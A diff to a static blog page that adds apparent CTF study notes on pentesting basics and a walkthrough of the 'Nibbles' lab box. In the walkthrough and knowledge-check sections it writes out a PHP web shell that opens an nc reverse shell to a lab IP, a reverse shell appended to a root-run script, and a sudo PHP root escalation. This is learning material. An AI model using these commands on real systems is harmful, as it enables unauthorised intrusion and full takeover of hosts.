@@ -60,7 +60,7 @@
   "headline": "Getting Started",
   "description" : "Getting Started",
   "inLanguage" : "en",
-  "wordCount":  0 ,
+  "wordCount":  239 ,
   "datePublished" : "0001-01-01T00:00:00",
   "dateModified" : "0001-01-01T00:00:00",
   "image" : "https:\/\/ctf-journey.github.io\/",
@@ -301,7 +301,97 @@ if (!doNotTrack) {
 
     <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 pt-4">
       <article role="main" class="blog-post">
-        
+        <h2 id="pentesting-basics">Pentesting basics</h2>
+<ul>
+<li>Common terms
+<ul>
+<li>shell, port, web server</li>
+</ul>
+</li>
+<li>Basic tools
+<ul>
+<li>ssh, netcat, tmux, vim</li>
+</ul>
+</li>
+<li>Service scanning
+<ul>
+<li>nmap, nmap scripts, banner grabbing, ftp, smb+shares, snmp (community string -  get network info and creds)</li>
+</ul>
+</li>
+<li>Web enumeration
+<ul>
+<li>gobuster (with seclists), banner grabbing, Whatweb, Certificates, Robots.txt, Source Code</li>
+</ul>
+</li>
+<li>public exploits
+<ul>
+<li>searchsploit, metasploit</li>
+</ul>
+</li>
+<li>types of shells
+<ul>
+<li>reverse shell</li>
+<li>bind shell</li>
+<li>Web Shell</li>
+<li>upgrade a shell with <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></li>
+</ul>
+</li>
+<li>privilege escalation
+<ul>
+<li>enumeration scripts (Linux enumeration scripts include LinEnum and linuxprivchecker, and for Windows include Seatbelt and JAWS), or Privilege Escalation Awesome Scripts SUITE (PEASS) for both</li>
+<li>Kernel Exploits</li>
+<li>Vulnerable Software</li>
+<li>User Privileges</li>
+<li>Scheduled Tasks</li>
+<li>Exposed Credentials</li>
+<li>SSH Keys</li>
+<li><code>(user2 : user2) NOPASSWD: /bin/bash</code> as user1 means <code>sudo -u user2 /bin/bash</code> works</li>
+</ul>
+</li>
+<li>transfering files
+<ul>
+<li>wget, SCP, Base64</li>
+</ul>
+</li>
+</ul>
+<h2 id="attacking-your-first-box">Attacking Your First Box</h2>
+<ul>
+<li>nibbles, enumeration
+<ul>
+<li><code>nmap -sV --open &lt;IP&gt;</code></li>
+</ul>
+</li>
+<li>nibbles, web footprinting
+<ul>
+<li>whatweb, <code>gobuster dir -u http://10.129.42.190/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt</code></li>
+</ul>
+</li>
+<li>nibbles, initial footprinting
+<ul>
+<li>upload <code>&lt;?php system (&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 9443 &gt;/tmp/f&quot;); ?&gt;</code> and use <code>nc -lvnp 9443</code> to catch shell and <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> to upgrade it</li>
+</ul>
+</li>
+<li>nibbles, privilege escation
+<ul>
+<li><code>monitor.sh</code> had sudo -l permission as root, can use <code>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.39 8443 &gt;/tmp/f' | tee -a monitor.sh</code> to modify and connect as root</li>
+</ul>
+</li>
+<li>nibbles, metasploit
+<ul>
+<li>use msf module <code>multi/http/nibbleblog_file_upload</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="knowledge-check">Knowledge check</h2>
+<ul>
+<li>GetSimple CMS
+<ul>
+<li>user flag is enter admin page <code>admin:admin</code>, edit php theme</li>
+<li>root flag is suid php binary, use <code>sudo /usr/bin/php -r 'system(&quot;/bin/bash&quot;);'</code></li>
+</ul>
+</li>
+</ul>
+
       </article>
     </div>
   </div>
